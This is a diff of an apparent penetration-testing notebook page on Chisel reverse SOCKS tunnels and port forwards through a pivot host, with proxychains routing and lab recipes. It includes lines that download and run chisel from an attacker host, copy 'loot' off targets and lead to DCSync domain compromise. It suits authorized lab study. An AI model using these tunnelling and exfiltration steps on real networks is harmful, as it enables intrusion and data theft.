@@ -9,6 +9,128 @@ hideFooterPagination: true
 
 {/* Generated from Commands/chisel.md. Edit the Markdown source, then run scripts/sync_site.py. */}
 
+## Build a reverse SOCKS tunnel in three places
+
+The workstation runs the Chisel server. The pivot runs the client and initiates the outbound connection. Your enumeration tool runs on the workstation and connects through the resulting SOCKS listener. These are three separate roles even when two belong to the same machine.
+
+### Start the receiving side
+
+```bash
+# Workstation; choose a port reachable from the pivot.
+./chisel server -p 8080 --reverse
+```
+
+Record the server's displayed fingerprint. Where your installed client supports fingerprint pinning, use that value with its fingerprint option so the client verifies the intended server. The Chisel transport port 8080 is not the SOCKS port used by your enumeration client.
+
+### Connect from the pivot
+
+```bash
+# Linux pivot:
+./chisel client WORKSTATION_IP:8080 R:socks
+```
+
+```powershell
+# Windows pivot, using the matching binary:
+.\chisel.exe client WORKSTATION_IP:8080 R:socks
+```
+
+Choose the binary for the pivot's platform/architecture. WORKSTATION_IP must be reachable from the pivot. Read the logs on both sides and confirm the reverse listener was created; starting a process is not proof of a live tunnel.
+
+### Point one client at the SOCKS listener
+
+Use a dedicated proxychains configuration with a single intended chain and the relevant DNS setting:
+
+```text
+strict_chain
+proxy_dns
+[ProxyList]
+socks5 127.0.0.1 1080
+```
+
+```bash
+proxychains -f ./proxychains-lab.conf curl -I http://INTERNAL_IP/
+proxychains -f ./proxychains-lab.conf nmap -sT -Pn -n -p 80,445 INTERNAL_IP
+```
+
+Start with one service already verified from the pivot. Keep broad scans for after the path works. SOCKS is a TCP application proxy; raw-packet scan modes and UDP enumeration need another approach.
+
+### Forward a single service instead
+
+```bash
+# Pivot: expose the pivot-reachable INTERNAL_IP:80 on workstation loopback:8081.
+./chisel client WORKSTATION_IP:8080 R:127.0.0.1:8081:INTERNAL_IP:80
+# Workstation:
+curl -I http://127.0.0.1:8081/
+```
+
+Choose either the single-service mapping or SOCKS according to the task. Check whether the internal service expects a hostname, TLS SNI or domain authentication after the TCP path succeeds.
+
+| Symptom | Investigate |
+| --- | --- |
+| Client cannot connect | Workstation address, listener bind, firewall, egress and transport port |
+| Server connects but cannot create reverse listener | Port already in use or reverse mode not enabled |
+| SOCKS connection fails | Wrong local SOCKS port/configuration or dead tunnel |
+| Only one internal destination fails | Pivot-to-destination routing/firewall/service |
+| IP works but hostname fails | DNS resolution location and lab resolver |
+| HTTP responds with unexpected application | Host header, scheme, port and redirects |
+
+Keep the session running while clients depend on it. Stop your tunnel processes and verify their listeners disappear during cleanup. The original recipes below remain useful for their specific lab addresses; the roles above explain which values to replace.
+
+## Chisel: choose the operation and read the result
+
+Forward connections through a reachable pivot host.
+
+### What the result establishes
+
+Draw the tunnel endpoints and verify where a reverse listener appears before routing a client through it.
+
+### Prerequisites and common failures
+
+R: reverses listener placement. A SOCKS endpoint, a single TCP forward and an application listener serve different purposes.
+
+### Example 1: Commands
+
+Run in: **Kali and pivot**.
+
+```bash
+# Kali
+./chisel server -p 8080 --reverse
+# Pivot
+./chisel client KALI_IP:8080 R:socks
+# Kali: put this in the ProxyList section of /etc/proxychains4.conf
+# socks5 127.0.0.1 1080
+```
+
+### Example 2: Chisel: Quick Tunnel Reference
+
+Run in: **Saved lab example**.
+
+```bash
+# Single remote port -> your localhost
+./chisel client ATTACKER:8080 R:3389:172.16.5.19:3389
+```
+
+Saved context: [Chisel: Quick Tunnel Reference — Chisel: Quick Tunnel Reference](/pivoting/chisel). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+### Example 3: Chisel: Quick Tunnel Reference
+
+Run in: **Saved lab example**.
+
+```bash
+# Attacker = server (reverse SOCKS)
+./chisel server -p 8080 --reverse
+# Victim = client, opens a reverse SOCKS5 proxy back to you
+./chisel client ATTACKER:8080 R:socks
+# then route tools through 127.0.0.1:1080
+proxychains nxc smb 172.16.5.0/24
+```
+
+Saved context: [Chisel: Quick Tunnel Reference — Chisel: Quick Tunnel Reference](/pivoting/chisel). The block is retained as recorded; replace lab-specific values and omit transcript prompts/output when entering commands.
+
+## Saved commands and notebook recipes
+
+Forward connections through a reachable pivot host.
+
 Replace UPPER_CASE values with your lab values.
 
 [Search this tool’s saved examples](/commands/notebook?tool=chisel) · [All tools](/index)
@@ -50,6 +172,13 @@ wget http://<KALI>:8080/chisel -O /tmp/chisel && chmod +x /tmp/chisel
 proxychains nxc smb 172.16.119.11 -u user -p pass
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — Option A — chisel + proxychains (SOCKS)](/cheatsheets/ad-attack-path-worked-example#option-a-—-chisel-+-proxychains-socks)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="🗺️ The kill chain (this assessment)">
@@ -82,6 +211,13 @@ DCSync against DC01
 FULL DOMAIN COMPROMISE
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Active Directory Attack Path: Worked Lab — 🗺️ The kill chain (this assessment)](/cheatsheets/ad-attack-path-worked-example#-the-kill-chain-this-assessment)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Chisel: Quick Tunnel Reference">
@@ -99,12 +235,26 @@ FULL DOMAIN COMPROMISE
 proxychains nxc smb 172.16.5.0/24
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Chisel: Quick Tunnel Reference — Existing notes and worked examples](/pivoting/chisel#existing-notes-and-worked-examples)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Chisel: Quick Tunnel Reference**
 
 ```bash
 # Single remote port -> your localhost
 ./chisel client ATTACKER:8080 R:3389:172.16.5.19:3389
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Chisel: Quick Tunnel Reference — Existing notes and worked examples](/pivoting/chisel#existing-notes-and-worked-examples)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -119,6 +269,13 @@ proxychains nxc smb 172.16.5.0/24
 ./chisel server --reverse        # listens on 8080, opens a SOCKS proxy on 1080 when a client connects
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Ticket from Linux — Step 1 — Build a SOCKS tunnel through the pivot (chisel)](/password-attacks/pass-the-ticket-from-linux#step-1-—-build-a-socks-tunnel-through-the-pivot-chisel)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Step 2 — Route tools through the proxy (proxychains)">
@@ -132,6 +289,13 @@ proxychains nxc smb 172.16.5.0/24
 # socks4  127.0.0.1 9050      ← comment out the default Tor line
 socks5  127.0.0.1 1080        ← add chisel's SOCKS port
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Ticket from Linux — Step 2 — Route tools through the proxy (proxychains)](/password-attacks/pass-the-ticket-from-linux#step-2-—-route-tools-through-the-proxy-proxychains)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -154,6 +318,13 @@ socks5  127.0.0.1 1080        ← add chisel's SOCKS port
 # forward a Kali service INTO the network (internal host can reach Kali:8000):
 ./chisel client <KALI_IP>:9001 R:172.16.119.13:8000:127.0.0.1:8000
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting and File Transfer: Field Reference — 2. chisel (SOCKS + port forwards)](/cheatsheets/pivoting-file-transfer#2-chisel-socks-+-port-forwards)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -185,6 +356,13 @@ scp jbetty@<DMZ_IP>:/tmp/loot.zip ~/loot/
 #    Kali:     echo '<paste>' | base64 -d > x
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting and File Transfer: Field Reference — Pulling files FROM the target to Kali (the hard direction)](/cheatsheets/pivoting-file-transfer#pulling-files-from-the-target-to-kali-the-hard-direction)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 <Accordion title="Step 3 — Verify the tunnel is actually up">
@@ -198,6 +376,13 @@ Context from the notebook: If it's empty, the tunnel isn't established — make 
 ```text
 ./chisel server --reverse
 ```
+
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pass the Ticket from Linux — Step 3 — Verify the tunnel is actually up](/password-attacks/pass-the-ticket-from-linux#step-3-—-verify-the-tunnel-is-actually-up)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
 
 </Accordion>
 
@@ -213,6 +398,13 @@ Context from the notebook: Pivot but there's  no SSH  on the host chisel  (SOCKS
 chisel server --reverse
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting, Tunneling, and Port Forwarding: Module Notes — ⏱️ DECISION HEADER — "I need to… → do…"](/modules/pivoting-tunneling-port-forwarding#-decision-header-—-i-need-to…-→-do…)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 **Pivoting, Tunneling, and Port Forwarding: Module Notes**
 
 Context from the notebook: Pivot but there's  no SSH  on the host chisel  (SOCKS/forward over HTTP) chisel server --reverse  /  chisel client … R:socks
@@ -221,6 +413,21 @@ Context from the notebook: Pivot but there's  no SSH  on the host chisel  (SOCKS
 chisel client … R:socks
 ```
 
+{/* VAULT_ORIGINAL_LINK_START */}
+
+**Original note sections:** [Pivoting, Tunneling, and Port Forwarding: Module Notes — ⏱️ DECISION HEADER — "I need to… → do…"](/modules/pivoting-tunneling-port-forwarding#-decision-header-—-i-need-to…-→-do…)
+
+{/* VAULT_ORIGINAL_LINK_END */}
+
+
 </Accordion>
 
 </AccordionGroup>
+
+{/* VAULT_RELATED_START */}
+
+**Source material and related references**
+
+- [Chisel: Quick Tunnel Reference](/pivoting/chisel)
+
+{/* VAULT_RELATED_END */}
